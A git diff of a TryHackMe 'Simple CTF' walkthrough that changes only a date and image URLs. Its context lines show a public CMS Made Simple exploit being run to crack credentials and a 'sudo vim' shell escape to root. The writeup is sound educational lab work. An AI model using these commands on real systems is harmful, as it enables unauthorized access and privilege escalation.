@@ -4,7 +4,7 @@ Room link: [https://tryhackme.com/room/easyctf](https://tryhackme.com/room/easyc
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 07/02/2023
+This writeup was last updated: 07/04/2023
 
 # Scanning and Enumeration
 > Port Scanning Using Nmap
@@ -95,7 +95,7 @@ DOWNLOADED: 4612 - FOUND: 3
 > Vulnerability Identification Using Exploit DB
 6. `firefox http://{TARGET IP}/simple` to launch Firefox and redirect it to the target's **/simple** directory
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/CMS%20Made%20Simple.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/CMS%20Made%20Simple.png)
 
 7. `searchsploit "CMS made simple 2.2.8" --www` 
 ```bash
@@ -153,7 +153,7 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 └─$ gedit 46635
 ```
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py.png)
 
 13. `python 46635` to execute the exploit again, which ended up outputting an error onto our terminal saying that we're missing the required arguments needed for the script to be able to successfully execute
 ```bash
@@ -185,7 +185,7 @@ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invali
 ```
 15. `gedit 46635` to open up the Python script once again and make it so that our function ignores any error messages that may pop up when opening the wordlist
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py%20pt2.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py%20pt2.png)
 
 16. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}` to execute the exploit once again, which eneded up working and providing us with a set of credentials that we can use to authenticate as when connecting to the target
 ```bash
@@ -249,7 +249,7 @@ User mitch may run the following commands on Machine:
 ```
 23. `firefox "https://gtfobins.github.io/"` to launch Firefox and redirect it to the GTFOBins website, and search "vim", which ended up providing us with some code sequences that we could use to gain higher privileges within our target's compromised system
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/GTFOBins.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/GTFOBins.png)
 
 24. `sudo vim -c ':!/bin/sh'` to open the Vim text editor with root privileges and execute the shell command, which spawned us a Bourne shell (sh)
 ```bash
